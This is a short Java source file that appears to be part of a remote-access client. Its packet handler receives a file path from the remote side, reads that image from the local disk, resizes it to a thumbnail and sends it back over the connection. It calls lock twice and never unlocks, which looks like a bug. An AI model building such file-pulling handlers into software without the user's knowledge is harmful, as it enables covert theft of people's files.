package com.redpois0n.packets.in;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import com.redpois0n.Connection;
import com.redpois0n.RemoteScreen;
import com.redpois0n.utils.ImageUtils;

public class PacketLISTI extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.lock();
		
		String file = Connection.readLine();

		Connection.writeLine("IMGLIST");
		Connection.writeLine(file);

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = RemoteScreen.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encodeImage(screenShot, 1F);
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
